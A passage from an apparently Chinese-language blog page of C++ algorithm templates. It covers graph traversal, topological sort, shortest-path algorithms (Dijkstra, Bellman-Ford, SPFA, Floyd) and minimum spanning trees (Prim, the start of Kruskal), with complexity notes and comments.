h);<br></code></pre></div></td></tr></table></figure><h3 id="3-2-树与图的遍历"><a href="#3-2-树与图的遍历" class="headerlink" title="3.2 树与图的遍历"></a>3.2 树与图的遍历</h3><p>时间复杂度 O(n+m), n 表示点数，m 表示边数。</p><h4 id="3-2-1-深度优先遍历"><a href="#3-2-1-深度优先遍历" class="headerlink" title="3.2.1 深度优先遍历"></a>3.2.1 深度优先遍历</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    st[u] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// st[u] 表示点u已经被遍历过</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[u]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j]) dfs(j);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="3-2-2-宽度优先遍历"><a href="#3-2-2-宽度优先遍历" class="headerlink" title="3.2.2 宽度优先遍历"></a>3.2.2 宽度优先遍历</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>st[<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 表示1号点已经被遍历过</span><br>q.push(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">while</span> (q.size())<br>&#123;<br>    <span class="hljs-keyword">int</span> t = q.front();<br>    q.pop();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j])<br>        &#123;<br>            st[j] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 表示点j已经被遍历过</span><br>            q.push(j);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-3-拓扑排序"><a href="#3-3-拓扑排序" class="headerlink" title="3.3 拓扑排序"></a>3.3 拓扑排序</h3><p>时间复杂度 O(n+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">topsort</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-comment">// d[i] 存储点i的入度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">if</span> (!d[i])<br>            q[ ++ tt] = i;<br><br>    <span class="hljs-keyword">while</span> (hh &lt;= tt)<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = q[hh ++ ];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (-- d[j] == <span class="hljs-number">0</span>)<br>                q[ ++ tt] = j;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果所有点都入队了，说明存在拓扑序列；否则不存在拓扑序列。</span><br>    <span class="hljs-keyword">return</span> tt == n - <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-4-Dijkstra算法"><a href="#3-4-Dijkstra算法" class="headerlink" title="3.4 Dijkstra算法"></a>3.4 Dijkstra算法</h3><h4 id="3-4-1-朴素版"><a href="#3-4-1-朴素版" class="headerlink" title="3.4.1 朴素版"></a>3.4.1 朴素版</h4><p>时间复杂是 O(n<sup>2</sup>+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> g[N][N];  <span class="hljs-comment">// 存储每条边</span><br><span class="hljs-keyword">int</span> dist[N];  <span class="hljs-comment">// 存储1号点到每个点的最短距离</span><br><span class="hljs-keyword">bool</span> st[N];   <span class="hljs-comment">// 存储每个点的最短路是否已经确定</span><br><br><span class="hljs-comment">// 求1号点到n号点的最短路，如果不存在则返回-1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">1</span>; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = <span class="hljs-number">-1</span>;     <span class="hljs-comment">// 在还未确定最短路的点中，寻找距离最小的点</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (!st[j] &amp;&amp; (t == <span class="hljs-number">-1</span> || dist[t] &gt; dist[j]))<br>                t = j;<br><br>        <span class="hljs-comment">// 用t更新其他点的距离</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            dist[j] = min(dist[j], dist[t] + g[t][j]);<br><br>        st[t] = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="3-4-2-堆优化版"><a href="#3-4-2-堆优化版" class="headerlink" title="3.4.2 堆优化版"></a>3.4.2 堆优化版</h4><p>时间复杂度 O(mlogn), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>&gt; PII;<br><br><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// 点的数量</span><br><span class="hljs-keyword">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// 存储所有点到1号点的距离</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点的最短距离是否已确定</span><br><br><span class="hljs-comment">// 求1号点到n号点的最短距离，如果不存在，则返回-1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">priority_queue</span>&lt;PII, <span class="hljs-built_in">vector</span>&lt;PII&gt;, greater&lt;PII&gt;&gt; heap;<br>    heap.push(&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;);      <span class="hljs-comment">// first存储距离，second存储节点编号</span><br><br>    <span class="hljs-keyword">while</span> (heap.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = heap.top();<br>        heap.pop();<br><br>        <span class="hljs-keyword">int</span> ver = t.second, distance = t.first;<br><br>        <span class="hljs-keyword">if</span> (st[ver]) <span class="hljs-keyword">continue</span>;<br>        st[ver] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[ver]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; distance + w[i])<br>            &#123;<br>                dist[j] = distance + w[i];<br>                heap.push(&#123;dist[j], j&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-5-Bellman-Ford算法"><a href="#3-5-Bellman-Ford算法" class="headerlink" title="3.5 Bellman-Ford算法"></a>3.5 Bellman-Ford算法</h3><p>时间复杂度 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n, m;       <span class="hljs-comment">// n表示点数，m表示边数</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// dist[x]存储1到x的最短路距离</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span>     // 边，<span class="hljs-title">a</span>表示出点，<span class="hljs-title">b</span>表示入点，<span class="hljs-title">w</span>表示边的权重</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> a, b, w;<br>&#125;edges[M];<br><br><span class="hljs-comment">// 求1到n的最短路距离，如果无法从1走到n，则返回-1。</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bellman_ford</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 如果第n次迭代仍然会松弛三角不等式，就说明存在一条长度是n+1的最短路径，由抽屉原理，路径中至少存在两个相同的点，说明图中存在负权回路。</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j ++ )<br>        &#123;<br>            <span class="hljs-keyword">int</span> a = edges[j].a, b = edges[j].b, w = edges[j].w;<br>            <span class="hljs-keyword">if</span> (dist[b] &gt; dist[a] + w)<br>                dist[b] = dist[a] + w;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] &gt; <span class="hljs-number">0x3f3f3f3f</span> / <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-6-SPFA算法（队列优化的Bellman-Ford算法）"><a href="#3-6-SPFA算法（队列优化的Bellman-Ford算法）" class="headerlink" title="3.6 SPFA算法（队列优化的Bellman-Ford算法）"></a>3.6 SPFA算法（队列优化的Bellman-Ford算法）</h3><p>时间复杂度 平均情况下 O(m)，最坏情况下 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// 总点数</span><br><span class="hljs-keyword">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// 存储每个点到1号点的最短距离</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否在队列中</span><br><br><span class="hljs-comment">// 求1号点到n号点的最短路距离，如果从1号点无法走到n号点则返回-1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>    q.push(<span class="hljs-number">1</span>);<br>    st[<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                <span class="hljs-keyword">if</span> (!st[j])     <span class="hljs-comment">// 如果队列中已存在j，则不需要将j重复插入</span><br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-7-SPFA判断图中是否存在负环"><a href="#3-7-SPFA判断图中是否存在负环" class="headerlink" title="3.7 SPFA判断图中是否存在负环"></a>3.7 SPFA判断图中是否存在负环</h3><p>时间复杂度是 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// 总点数</span><br><span class="hljs-keyword">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-keyword">int</span> dist[N], cnt[N];        <span class="hljs-comment">// dist[x]存储1号点到x的最短距离，cnt[x]存储1到x的最短路中经过的点数</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否在队列中</span><br><br><span class="hljs-comment">// 如果存在负环，则返回true，否则返回false。</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 不需要初始化dist数组</span><br>    <span class="hljs-comment">// 原理：如果某条最短路径上有n个点（除了自己），那么加上自己之后一共有n+1个点，由抽屉原理一定有两个点相同，所以存在环。</span><br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>    &#123;<br>        q.push(i);<br>        st[i] = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                cnt[j] = cnt[t] + <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (cnt[j] &gt;= n) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;       <span class="hljs-comment">// 如果从1号点到x的最短路中包含至少n个点（不包括自己），则说明存在环</span><br>                <span class="hljs-keyword">if</span> (!st[j])<br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-8-Floyd算法"><a href="#3-8-Floyd算法" class="headerlink" title="3.8 Floyd算法"></a>3.8 Floyd算法</h3><p>时间复杂度是 O(n<sup>3</sup>), n 表示点数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">初始化：<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (i == j) d[i][j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span> d[i][j] = INF;<br><br><span class="hljs-comment">// 算法结束后，d[a][b]表示a到b的最短距离</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">floyd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-9-朴素Prim算法"><a href="#3-9-朴素Prim算法" class="headerlink" title="3.9 朴素Prim算法"></a>3.9 朴素Prim算法</h3><p>时间复杂度是 O(n<sup>2</sup>+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// n表示点数</span><br><span class="hljs-keyword">int</span> g[N][N];        <span class="hljs-comment">// 邻接矩阵，存储所有边</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// 存储其他点到当前最小生成树的距离</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否已经在生成树中</span><br><br><br><span class="hljs-comment">// 如果图不连通，则返回INF(值是0x3f3f3f3f), 否则返回最小生成树的树边权重之和</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prim</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br><br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (!st[j] &amp;&amp; (t == <span class="hljs-number">-1</span> || dist[t] &gt; dist[j]))<br>                t = j;<br><br>        <span class="hljs-keyword">if</span> (i &amp;&amp; dist[t] == INF) <span class="hljs-keyword">return</span> INF;<br><br>        <span class="hljs-keyword">if</span> (i) res += dist[t];<br>        st[t] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ ) dist[j] = min(dist[j], g[t][j]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-10-Kruskal算法"><a href="#3-10-Kruskal算法" class="headerlink" title="3.10 Kruskal算法"></a>3.10 Kruskal算法</h3><p>时间复杂度是 O(mlogm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n, m;       <span class="hljs-comment">// n是点数，m是边数</span><br><span class="hljs-keyword">int</span> p[N];       <span class="hljs-comment">// 并查集的父节点数组</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span>     // 存储边</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> a, b, w;<br><br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>&lt; (<span class="hljs-keyword">const</span> Edge &amp;W)<span class="hljs-keyword">const</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> w &lt; W.w;<br>    &#125;<br>&#125;edges[M];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span>     <span class="hljs-comment">// 并查集核心操作</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kruskal</span><span 